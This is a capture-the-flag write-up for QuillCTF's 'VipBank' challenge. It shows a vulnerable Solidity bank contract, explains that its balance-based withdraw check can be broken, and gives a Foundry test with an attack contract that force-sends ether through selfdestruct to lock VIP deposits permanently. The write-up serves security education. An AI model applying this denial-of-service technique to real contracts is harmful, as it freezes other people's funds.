---
title: QuillCTF-3.VipBank
date: 2024-01-22 17:00:16
tags:
    - solidity
categories: 
    - QuillCTF
---

```
“This Bank is only for its VIP Customers.”
```

## Objective

- At any cost, lock the VIP user balance forever into the contract.

## Code

```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

contract VIP_Bank{

    address public manager;
    mapping(address => uint) public balances;
    mapping(address => bool) public VIP;
    uint public maxETH = 0.5 ether;

    constructor() {
        manager = msg.sender;
    }

    modifier onlyManager() {
        require(msg.sender == manager , "you are not manager");
        _;
    }

    modifier onlyVIP() {
        require(VIP[msg.sender] == true, "you are not our VIP customer");
        _;
    }

    function addVIP(address addr) public onlyManager {
        VIP[addr] = true;
    }

    function deposit() public payable onlyVIP {
        require(msg.value <= 0.05 ether, "Cannot deposit more than 0.05 ETH per transaction");
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) public onlyVIP {
        require(address(this).balance <= maxETH, "Cannot withdraw more than 0.5 ETH per transaction");
        require(balances[msg.sender] >= _amount, "Not enough ether");
        balances[msg.sender] -= _amount;
        (bool success,) = payable(msg.sender).call{value: _amount}("");
        require(success, "Withdraw Failed!");
    }

    function contractBalance() public view returns (uint){
        return address(this).balance;
    }

}
```

## Observation

Our objective is to DOS the Vip Bank.we can read the check in `withdraw()` function
```
require(address(this).balance <= maxETH, "Cannot withdraw more than 0.5 ETH per transaction");
```

so i f we make `address(this).balance > maxETH` , nobody can withdraw anymoney from the contract.

also we can see the deposit function only can be called by the VIP person. but we can use `selfdestruct` to transfer the money.


## Attack

```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../src/3-VipBank/Bank.sol";

contract Attack {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    receive() external payable {}

    function exp() public {
        selfdestruct(payable(target));
    }
}

contract BankTest is Test {
    VIP_Bank target;
    address admin;
    address attacker;
    address customer;

    function setUp() public {
        admin = makeAddr("admin");
        attacker = makeAddr("attacker");
        customer = makeAddr("customer");
        vm.deal(attacker, 10 ether);
        vm.deal(customer, 10 ether);
        vm.startPrank(admin);
        target = new VIP_Bank();
        target.addVIP(customer);
        vm.stopPrank();
    }

    function att() public {
        vm.startPrank(customer);
        target.deposit{value: 0.05 ether}();
        vm.stopPrank();
        vm.startPrank(attacker);
        assertEq(0.05 ether, target.contractBalance());
        Attack attack = new Attack(address(target));
        payable(attack).transfer(1 ether);
        attack.exp();
        vm.stopPrank();
        assertEq(target.contractBalance(), 1.05 ether);
        vm.startPrank(customer);
        vm.expectRevert();
        target.withdraw(0.05 ether);
    }
}
